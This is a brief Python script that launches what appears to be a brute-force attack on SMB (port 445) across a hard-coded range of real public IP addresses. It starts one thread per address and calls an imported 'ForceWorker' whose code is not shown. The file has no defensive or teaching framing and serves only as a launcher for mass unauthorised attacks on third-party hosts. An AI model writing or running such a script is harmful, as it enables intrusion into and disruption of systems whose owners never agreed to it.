from packages import ForceWorker
from threading import Thread
from netaddr import IPRange


if __name__ == '__main__':
    ips, ipe = '95.53.194.0-95.54.194.255'.split('-')
    port = 445
    ipr = IPRange(ips, ipe)

    for ip in ipr:
        Thread(target=ForceWorker, args=(str(ip), port)).start()
